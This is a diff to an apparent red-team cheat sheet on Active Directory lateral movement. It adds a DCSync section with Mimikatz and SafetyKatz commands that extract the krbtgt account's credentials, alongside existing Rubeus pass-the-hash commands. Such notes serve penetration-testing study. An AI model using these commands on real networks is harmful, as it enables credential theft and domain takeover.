@@ -1,7 +1,8 @@
 # Lateral Movement
 * [General](#General)
 * [Dumping LSASS](#Dumping-LSASS)
-* [Overpass The Hash](Overpass-The-Hash)
+* [Overpass The Hash](#Overpass-The-Hash)
+* [DC-Sync](#DC-Sync)
 * [Mimikatz](#Mimikatz) 
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 
@@ -91,6 +92,19 @@ Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
 - Below command needs elevation
 ```
 Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+## DC Sync
+- Extract creds from the DC without code execution using DA privileges.
+
+#### Mimikatz DCSync attack
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+#### Safetykatz.exe
+```
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
 ## Mimikatz
